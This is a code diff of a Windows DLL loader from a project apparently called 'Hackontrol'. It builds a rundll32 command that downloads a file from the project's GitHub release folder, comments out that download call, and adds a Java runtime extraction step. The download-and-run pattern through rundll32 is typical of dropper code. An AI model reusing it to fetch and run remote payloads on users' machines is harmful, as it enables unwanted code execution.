@@ -1,8 +1,8 @@
 #include <khopanwindows.h>
 #include <khopanerror.h>
 #include <khopanstring.h>
-#include "initialize.h"
 #include "downloadjar.h"
+#include "extractor.h"
 
 #define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
 
@@ -23,25 +23,29 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);
 
 	if(!system32Path) {
-		KHWin32DialogErrorW(ERROR_CAN_NOT_COMPLETE, L"KHFormatMessageW");
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		goto freeWindowsDirectoryPath;
 	}
 
 	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\" RUNDLL32EXE, system32Path);
 
 	if(!rundll32Path) {
-		KHWin32DialogErrorW(ERROR_CAN_NOT_COMPLETE, L"KHFormatMessageW");
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		goto freeSystem32Path;
 	}
 
 	LPWSTR downloadArgument = KHFormatMessageW(L"%ws " LIBRARY_NAME L",DownloadFile https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/" REMOTE_FILE_NAME L"," JAR_NAME, rundll32Path);
 
 	if(!downloadArgument) {
-		KHWin32DialogErrorW(ERROR_CAN_NOT_COMPLETE, L"KHFormatMessageW");
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		goto freeRundll32Path;
 	}
 
-	if(DownloadJar(system32Path, rundll32Path, downloadArgument)) {
+	/*if(DownloadJar(system32Path, rundll32Path, downloadArgument)) {
+		goto freeDownloadArgument;
+	}*/
+
+	if(ExtractJRE()) {
 		goto freeDownloadArgument;
 	}
 
